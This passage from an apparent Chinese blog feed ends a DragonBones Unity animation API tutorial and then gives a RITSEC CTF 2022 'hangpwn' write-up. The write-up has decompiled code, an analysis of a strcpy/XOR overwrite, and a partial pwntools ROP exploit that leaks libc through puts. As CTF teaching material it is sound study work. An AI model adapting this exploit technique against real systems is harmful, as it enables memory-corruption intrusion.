class="line">AnimationFadeOutMode.SameLayerAndGroup &#x2F;&#x2F;淡出同层并且同组的动画状态，值同等于3</span><br><span class="line"></span><br><span class="line">AnimationFadeOutMode.ALL&#x2F;&#x2F;淡出所有的动画状态，值同等于4</span><br><span class="line"></span><br><span class="line">AnimationFadeOutMode.Single &#x2F;&#x2F; 不替换同名的动画状态，值同等于5</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.fadeIn(&quot;walk&quot;, 0.3, 0, 0, &quot;normalGroup&quot;).resetToPose &#x3D; false;</span><br><span class="line">armature.animation.fadeIn(&quot;attack&quot;, 0.3, 1, 0, &quot;attackGroup&quot;).resetToPose &#x3D; false;</span><br></pre></td></tr></table></figure><h3 id="指定时间开始播放指定动画"><a href="#指定时间开始播放指定动画" class="headerlink" title="指定时间开始播放指定动画"></a>指定时间开始播放指定动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndPlayByTime(string animationName, float time &#x3D; 0.0f, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p><code>GotoAndPlayByTime()</code>-指定时间开始播放.</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><p>  <code>time</code>- 播放开始的时间。 (以秒为单位)</p><p><code>playTimes</code>- 循环播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p>返回值：</p><p>播放的动画状态。</p><h3 id="指定帧开始播放指定动画"><a href="#指定帧开始播放指定动画" class="headerlink" title="指定帧开始播放指定动画"></a>指定帧开始播放指定动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndPlayByFrame(string animationName, uint frame &#x3D; 0, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p><code>GotoAndPlayByFrame</code>从指定帧开始播放指定的动画</p><p>参数:</p><p><code>animationName</code>- 动画数据名称。</p><p><code>frame</code>- 播放开始的帧数。</p><p><code>playTimes</code>- 播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p>返回值：</p><p>播放的动画状态。</p><h3 id="指定进度开始播放指定的动画"><a href="#指定进度开始播放指定的动画" class="headerlink" title="指定进度开始播放指定的动画"></a>指定进度开始播放指定的动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndPlayByProgress(string animationName, float progress &#x3D; 0.0f, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p><code>GotoAndPlayByProgress</code>指定进度开始播放指定的动画。</p><p>参数：</p><p><code>animationName</code> 动画数据名称。</p><p><code>progress</code>- 开始播放的进度。</p><p><code>playTimes</code>- 播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p>返回值：</p><p>returns-播放的动画状态。</p><h3 id="指定时间停止指定动画播放"><a href="#指定时间停止指定动画播放" class="headerlink" title="指定时间停止指定动画播放"></a>指定时间停止指定动画播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndStopByTime(string animationName, float time &#x3D; 0.0f)</span><br></pre></td></tr></table></figure><p>在指定时间停止指定动画播放。</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><p><code>time</code>- 停止的时间。 (以秒为单位)</p><p>返回值：播放的动画状态。</p><h3 id="指定帧停止指定动画的播放"><a href="#指定帧停止指定动画的播放" class="headerlink" title="指定帧停止指定动画的播放"></a>指定帧停止指定动画的播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndStopByFrame(string animationName, uint frame &#x3D; 0)</span><br></pre></td></tr></table></figure><p>在指定帧停止指定动画的播放</p><p>参数：</p><p><code>animationName</code>- 动画数据名称.</p><p><code>frame</code>- 停止的帧数。</p><p> 返回值：</p><p>播放的动画状态。</p><h3 id="指定的进度停止指定的动画播放"><a href="#指定的进度停止指定的动画播放" class="headerlink" title="指定的进度停止指定的动画播放"></a>指定的进度停止指定的动画播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndStopByProgress(string animationName, float progress &#x3D; 0.0f)</span><br></pre></td></tr></table></figure><p>指定的进度停止指定的动画播放</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><p><code>progress</code>- 停止进度。</p><p>返回状态：播放的动画状态。</p><h3 id="获取指定的动画状态"><a href="#获取指定的动画状态" class="headerlink" title="获取指定的动画状态"></a>获取指定的动画状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GetState(string animationName)</span><br></pre></td></tr></table></figure><p>获取指定的动画状态</p><p>参数：</p><p><code>animationName</code>- 动画状态名称。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.play(&quot;walk&quot;);</span><br><span class="line">et walkState &#x3D; armature.animation.getState(&quot;walk&quot;);</span><br><span class="line">walkState.timeScale &#x3D; 0.5;</span><br></pre></td></tr></table></figure><h3 id="检查是否包含指定的动画数据"><a href="#检查是否包含指定的动画数据" class="headerlink" title="检查是否包含指定的动画数据"></a>检查是否包含指定的动画数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public bool HasAnimation(string animationName)</span><br><span class="line">        &#123;</span><br><span class="line">            return this._animations.ContainsKey(animationName);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>HasAnimation()</code>检查是否包含指定的动画数据</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><h3 id="获取所有的动画状态"><a href="#获取所有的动画状态" class="headerlink" title="获取所有的动画状态"></a>获取所有的动画状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;AnimationState&gt; GetStates()</span><br></pre></td></tr></table></figure><p><code>GetStates()</code> 获取所有的动画状态.</p><h3 id="检查是否有动画状态正在播放"><a href="#检查是否有动画状态正在播放" class="headerlink" title="检查是否有动画状态正在播放"></a>检查是否有动画状态正在播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public bool isPlaying</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.isPlaying</span><br></pre></td></tr></table></figure><p>为True  表在播放，为flase则未在播放。</p><h3 id="检查是否所有的动画状态均已播放完毕"><a href="#检查是否所有的动画状态均已播放完毕" class="headerlink" title="检查是否所有的动画状态均已播放完毕"></a>检查是否所有的动画状态均已播放完毕</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public bool isCompleted</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.isCompleted</span><br></pre></td></tr></table></figure><h3 id="上一个播放的动画状态名称"><a href="#上一个播放的动画状态名称" class="headerlink" title="上一个播放的动画状态名称"></a>上一个播放的动画状态名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public string lastAnimationName</span><br><span class="line">&#x2F;&#x2F; 示例：</span><br><span class="line">armature.animation.isCompleted</span><br></pre></td></tr></table></figure><h3 id="所有动画数据的名称"><a href="#所有动画数据的名称" class="headerlink" title="所有动画数据的名称"></a>所有动画数据的名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;string&gt; animationNames</span><br></pre></td></tr></table></figure><h3 id="所有的动画数据"><a href="#所有的动画数据" class="headerlink" title="所有的动画数据"></a>所有的动画数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public Dictionary&lt;string, AnimationData&gt; animations</span><br></pre></td></tr></table></figure><p>一个可以快速使用的动画配置实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationConfig animationConfig</span><br></pre></td></tr></table></figure><h3 id="上一个播放的动画状态"><a href="#上一个播放的动画状态" class="headerlink" title="上一个播放的动画状态"></a>上一个播放的动画状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState lastAnimationState</span><br></pre></td></tr></table></figure><h2 id="替换骨骼动画"><a href="#替换骨骼动画" class="headerlink" title="替换骨骼动画"></a>替换骨骼动画</h2><p>Assets\DragonBones\Editor\UnityEditor.cs  里用执行替换骨骼动画的函数–<code>ChangeDragonBonesData</code></p><p>拷贝<code>Assets\DragonBones\Editor\UnityEditor.cs</code>到目录<code>Assets\DragonBones\Scripts\animation\</code></p><p>​    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static bool ChangeDragonBonesData(UnityArmatureComponent _armatureComponent, TextAsset dragonBoneJSON)</span><br></pre></td></tr></table></figure><p><code>ChangeDragonBonesData</code>的一个参数时要替换骨骼与动画<code>UnityArmatureComponent</code>控件，二个是替换成的dragonBoneJSON数据。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var anmi2&#x3D;xxx.GetComponent&lt;DragonBones.UnityArmatureComponent&gt;();</span><br><span class="line">UnityDragonBonesData SSS;</span><br><span class="line">UnityFactory.factory.Clear(true); &#x2F;&#x2F;清楚缓存</span><br><span class="line">SSS&#x3D;UnityEditor.AssetDatabase.LoadAssetAtPath&lt;UnityDragonBonesData&gt;(&quot;Assets&#x2F;kwww&#x2F;ssss_Data.asset&quot;);</span><br><span class="line">DragonBones.UnityEditor.ChangeDragonBonesData(anmi2,SSS.dragonBonesJSON);</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://github.com/DragonBones/DragonBonesCSharp" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp</a></p><p><a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/README-zh_CN.md" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp/blob/master/README-zh_CN.md</a></p><p><a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/Unity/README-zh_CN.md" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp/blob/master/Unity/README-zh_CN.md</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近跑路的事情稳了，又拿出2019年设计的小游戏草案在那里改。找文章发现DragonBones骨骼可以用来unity中使用。但项目需求使用时，踩了很多坑。</summary>
    
    
    
    <category term="unity" scheme="lexsd6.github.io/categories/unity/"/>
    
    
    <category term="DragonBones" scheme="lexsd6.github.io/tags/DragonBones/"/>
    
    <category term="c#" scheme="lexsd6.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>RITSEC-CTF-2022-PWN-hangpwn</title>
    <link href="lexsd6.github.io/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/"/>
    <id>lexsd6.github.io/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/</id>
    <published>2022-04-07T13:29:49.630Z</published>
    <updated>2022-04-07T15:39:47.867Z</updated>
    
    <content type="html"><![CDATA[<p>这个比赛很迷惑。感觉大多题很水但是ctftime比重高。这是其中一个有点意思的题<a id="more"></a>。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>题目没有开启PIE和canary。减少了不小负担。</p><p>题目的主要功能很简单就是猜测字符，主要代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> guessed[<span class="number">7</span>]; <span class="comment">// [rsp+1h] [rbp-3Fh]</span></span><br><span class="line">  <span class="keyword">char</span> guess_buffer[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">16</span>]; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  game_0 state; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v10 = v3;</span><br><span class="line">  init_game();</span><br><span class="line">  *(_QWORD *)&amp;state.attempts = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)&amp;state.words[<span class="number">6</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)<span class="built_in">buffer</span> = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)&amp;<span class="built_in">buffer</span>[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)guess_buffer = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)&amp;guess_buffer[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)guessed = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;guessed[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  guessed[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !state.game_over &amp;&amp; !state.solved )</span><br><span class="line">  &#123;</span><br><span class="line">    print_game(&amp;state);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter letter: "</span>);</span><br><span class="line">    v4 = fgets(<span class="built_in">buffer</span>, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v4;</span><br><span class="line">    *((_BYTE *)&amp;v10 + <span class="built_in">strcspn</span>(<span class="built_in">buffer</span>, <span class="string">"\n"</span>) - <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(<span class="built_in">buffer</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      char_comp(<span class="built_in">buffer</span>, <span class="string">"v&#125;zsuag"</span>, guessed, state.attempts, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( state.attempts == <span class="number">6</span> )</span><br><span class="line">        state.game_over = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"FINAL GUESS\nEnter word: "</span>, <span class="string">"v&#125;zsuag"</span>);</span><br><span class="line">      v4 = fgets(guess_buffer, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v4;</span><br><span class="line">      <span class="keyword">if</span> ( compare_enc(guess_buffer, <span class="string">"v&#125;zsuag"</span>, <span class="number">7</span>) )</span><br><span class="line">        state.solved = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(state.words[state.attempts], <span class="built_in">buffer</span>);</span><br><span class="line">      enc(state.words[state.attempts], <span class="number">1</span>);</span><br><span class="line">      ++state.attempts;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"\n\tINVALID INPUT"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  print_game(&amp;state);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个功能有点沉于，首先这个猜测在一个循环里进行。但是这个循环由两参数控制<code>game_over</code>和<code>solved</code>控制，其中一个为真则循环结束。</p><p>而这个猜测有两个阶段：</p><p>第一个阶段要求输入这个字符，如何这个字符在目的字符里则显现出来。若输入不是一个字符则重新进入第一阶段。</p><p>第二阶段是输入一个字符串与目的字符串比较，若比较成功则solved为真。若二阶段进行了6次则game_over为真。</p><p>但是在布局时奇怪：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)&amp;state.words</span><br><span class="line">*(_QWORD *)&amp;state.game_over</span><br></pre></td></tr></table></figure><p><code>state.words</code>与<code>state.game_over</code>两者相临，即state.word结束后的高地址就是<code>state.game_over</code>.这样我们就有机会覆盖<code>state.game_over</code>.</p><p>同时代码中用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(state.words[state.attempts], <span class="built_in">buffer</span>);</span><br></pre></td></tr></table></figure><p>来写入words。</p><p>而strcpy有个特性：</p><blockquote><p>strcpy，即string copy（字符串复制）的缩写。</p><p>strcpy是<a href="https://baike.baidu.com/item/C%2B%2B/99272" target="_blank" rel="noopener">C++</a>语言的一个标准函数 ，strcpy把含有<a href="https://baike.baidu.com/item/' target="_blank" rel="noopener"\0'/9931274">‘\0’</a>结束符的字符串复制到另一个<a href="https://baike.baidu.com/item/地址空间" target="_blank" rel="noopener">地址空间</a>，返回值的类型为char*。</p></blockquote><p>换句话说，strcpy会在一个字符串后自动添加上’\x00’.</p><p>这样我们就有机会覆盖<code>state.game_over</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这样算我们输入6次就可以覆盖<code>state.game_over</code>那么为什么我们正常运行时，很难发现这个问题？</p><p>因为我们在覆盖<code>state.game_over</code>后，程序开始了下一次循环，<code>strcpy(state.words[state.attempts], buffer);</code>将覆盖<code>state.game_over</code>为我们输入的字符。这样’\x00’就被覆盖掉。因此我们得将<code>state.game_over</code>为0进行保留。</p><p>但是若我们输入’\x00’，<code>strlen(buffer)</code>将判断失败，无法写入<code>state.words</code></p><p>.幸好，题目中留个异或：<code>env()</code>函数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">enc</span><span class="params">(<span class="keyword">char</span> *words, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; length; ++i )</span><br><span class="line">    words[i] ^= <span class="number">0x34</span>u;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就可以输入‘\x34’字符来代替‘\x00’.从而无限制写入栈。</p><p>剩下就是简单栈溢出。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/04/3 10:13:59</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hangpwn'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x00000000004016dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016de : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016df : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004011dd : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">'BINGAUS'</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">10</span>):</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">p.sendline(<span class="string">'S'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wtaddr</span><span class="params">(addr)</span>:</span></span><br><span class="line">add=<span class="number">0x100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">xx=addr%add</span><br><span class="line">p.sendline(chr((addr%add)^<span class="number">0x34</span>))</span><br><span class="line">addr=addr//add</span><br><span class="line">p.sendline(<span class="string">'lexsd6'</span>)</span><br><span class="line"></span><br><span class="line">wtaddr(<span class="number">0x00000000004016e3</span>)</span><br><span class="line">wtaddr(e.got[<span class="string">'puts'</span>])</span><br><span class="line">wtaddr(e.sym[<span class="string">'puts'</span>])</span><br><span class="line">wtaddr(e.sym[<span class="string">'main'</span>])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'BINGAUS'</span>)</span><br><span class="line"></span><br><span class="line">libcaddr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(libcaddr))</span><br><span class="line">x=finder(<span class="string">'puts'</span>,libcaddr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">10</span>):</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">p.sendline(<span class="string">'S'</span>)</span><br><span 